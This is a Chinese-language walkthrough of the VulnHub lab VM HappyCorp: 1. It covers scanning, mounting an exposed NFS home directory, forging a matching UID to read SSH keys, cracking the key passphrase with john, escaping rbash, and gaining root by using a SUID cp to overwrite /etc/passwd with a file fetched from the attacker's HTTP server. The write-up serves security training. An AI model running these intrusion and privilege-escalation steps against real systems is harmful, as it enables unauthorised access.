## 简介

难度：普通的初级/中级虚拟机，只有几个转折点。  
| + 可能会发现它很容易/很难（取决于你的背景）。  
| + ......也取决于你攻击箱子的方式。  
| |  
| + 它应该能在VMware上工作。

目标：获得root

下载地址：[HappyCorp: 1 ~ VulnHub](https://www.vulnhub.com/entry/happycorp-1,296/)

## 获取靶机IP地址

    
    
    netdiscover -r 192.168.81.0/24
    

![1651997340_62777a9c78225a4e2b6fa.png!small?1651997341280](https://image.3001.net/images/20220508/1651997340_62777a9c78225a4e2b6fa.png!small?1651997341280)

靶机ip：81.157

kali IP：81.137

## 扫描开放端口服务

    
    
    nmap -A 192.168.81.157  

从nmap扫描中，我们看到了多个端口开放，如22：ssh、80：http、111：rpcbind、2049：nfs。

其中111和2049为我们不熟悉的服务，搜索一下，原来是共享文件存储，可以通过远程挂载获得文件。

![1651997630_62777bbef003133c98e3d.png!small?1651997631869](https://image.3001.net/images/20220508/1651997630_62777bbef003133c98e3d.png!small?1651997631869)

## 探测开发的端口80&2049

我们可以通过80端口的网页或者2049的文件共享看看有没有可利用的东西。

### 80端口

先来看一看网页，经查看，默认页面没有可利用信息，探测下级目录。

    
    
    gobuster dir -u http://192.168.81.157 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20
    

![1652000041_62778529136743576349d.png!small?1652000041879](https://image.3001.net/images/20220508/1652000041_62778529136743576349d.png!small?1652000041879)

下级目录中，/admin.php为一个登录页面,但是查看源码后，发现这是一个虚假页面。

![1652000246_627785f6763c8c7b5dbcb.png!small?1652000247332](https://image.3001.net/images/20220508/1652000246_627785f6763c8c7b5dbcb.png!small?1652000247332)

### 2049端口

网页信息没有可利用信息，我们去研究一下2049开发的服务，查看nfs共享信息，发现共享目录为/home/karl。

    
    
    showmount -e 192.168.81.157         //showmount查看nfs服务器共享文件，-e指定ip

![1652000500_627786f4a8c4ab60a21a6.png!small?1652000501487](https://image.3001.net/images/20220508/1652000500_627786f4a8c4ab60a21a6.png!small?1652000501487)

将共享文件挂载到kali本地。

    
    
    mkdir /tmp/nfs                       //创建文件夹
    mount 192.168.81.157:/home/karl /tmp/nfs           //挂载到此文件夹下
    cd /tmp/nfs       
    ls -al

![1652000843_6277884b3e137eaf8640e.png!small?1652000844038](https://image.3001.net/images/20220508/1652000843_6277884b3e137eaf8640e.png!small?1652000844038)

有一个.ssh目录，当我们尝试进入时显示权限不够，该文件的属主属组都为1001，我们在kali本机创建组和用户。

    
    
    groupadd --gid 1001 testg
    useradd -m --uid 1001 --group testg -s /bin/bash testu  
    su - testu  //切换用户

此时可以进去.ssh目录。

![1652003764_627793b4cc8504ca1d7c1.png!small?1652003765619](https://image.3001.net/images/20220508/1652003764_627793b4cc8504ca1d7c1.png!small?1652003765619)

进入user.txt，得到第一个flag。

![1652003915_6277944b9c76c92cee3c5.png!small?1652003916403](https://image.3001.net/images/20220508/1652003915_6277944b9c76c92cee3c5.png!small?1652003916403)

###

其他文件中，id_rsa为私钥，id_rsa.pub为公钥，authorized_keys为认证密钥（搜索rsa了解相关知识）

查看id_rsa.pub和authorized_keys后，我们看到karl，应该为ssh登录的用户名。

![1652005901_62779c0d273c281953140.png!small?1652005901981](https://image.3001.net/images/20220508/1652005901_62779c0d273c281953140.png!small?1652005901981)

下面我把私钥拷贝到kali下的tmp下，用于验证公钥加密，尝试登录发现需要口令。

![1652006916_6277a00425c9d70aa3961.png!small?1652006916913](https://image.3001.net/images/20220508/1652006916_6277a00425c9d70aa3961.png!small?1652006916913)

然后我们使用ssh2john将这个SSH私钥转换为可破解的文件，供john使用，并进一步使用rockyou.txt字典进行口令破解。

ssh2john id_rsa >pass.txt //pass.txt 为生成的文件

john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt //破解密码

![1652016621_6277c5ed634664dda515f.png!small](https://image.3001.net/images/20220508/1652016621_6277c5ed634664dda515f.png!small)

得到sheep，尝试登录，但是得到的是rbash（受限shell）。

    
    
    ssh -i id_rsa karl@192.168.81.157

![1652016767_6277c67f18596c55c1f04.png!small?1652016767895](https://image.3001.net/images/20220508/1652016767_6277c67f18596c55c1f04.png!small?1652016767895)

尝试直接访问bash shell，加上-t "/bin/sh"。

![1652017021_6277c77ddb5b4844688d1.png!small?1652017022644](https://image.3001.net/images/20220508/1652017021_6277c77ddb5b4844688d1.png!small?1652017022644)

成功获得了正常的shell。

## 权限提升

查找启用了SUID的文件。

    
    
    find / -perm -u=s -type f 2>/dev/null

![1652017154_6277c802e2d19920bd439.png!small?1652017155710](https://image.3001.net/images/20220508/1652017154_6277c802e2d19920bd439.png!small?1652017155710)

其中cp启用了 suid ，我们可以写一个passwd，拷贝覆盖掉靶机/etc/passwd，来实现提权。

为了不影响原账号，首先查看passwd文件，复制所有内容，写入kali，并且额外写入一个root级别权限用户。

 **1.复制靶机的passwd，写入到kali的/tmp/passwd**

![1652017504_6277c960aa8b137de9e85.png!small?1652017505575](https://image.3001.net/images/20220508/1652017504_6277c960aa8b137de9e85.png!small?1652017505575)

 **2.创建根权限级别用户**

    
    
    openssl passwd -1 -salt hack 123456    //成了一个新的加密密码

![1652017873_6277cad183e113e634b4c.png!small?1652017874298](https://image.3001.net/images/20220508/1652017873_6277cad183e113e634b4c.png!small?1652017874298)

写入新账号保存到/tmp/passwd。

![1652017986_6277cb422c2e4e75880af.png!small?1652017987004](https://image.3001.net/images/20220508/1652017986_6277cb422c2e4e75880af.png!small?1652017987004)

 **3.替换passwd文件**

首先在kali端开启http服务：

![1652018181_6277cc05623d239c08b03.png!small?1652018182168](https://image.3001.net/images/20220508/1652018181_6277cc05623d239c08b03.png!small?1652018182168)

然后在ssh端操作如下：

    
    
    cd /tmp
    wget <http://192.168.81.137:8000/passwd>cp passwd /etc/passwd
    su hack
    cd root
    cat root.txt

成功获取。

![1652018465_6277cd2182ee346e8c1c5.png!small?1652018466302](https://image.3001.net/images/20220508/1652018465_6277cd2182ee346e8c1c5.png!small?1652018466302)

## 补充

 **john用法**

sh2john id_rsa >pass.txt（写入该文件） //将SSH私钥转换为可破解的文件

john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt //破解

注意每个文件破解后将密码保存至家目录的/.john/john.pot 里，重复破解会显示。

![1652018580_6277cd94036a470981e09.png!small?1652018580761](https://image.3001.net/images/20220508/1652018580_6277cd94036a470981e09.png!small?1652018580761)

可以通过john --show +文件名 查看历史破解。

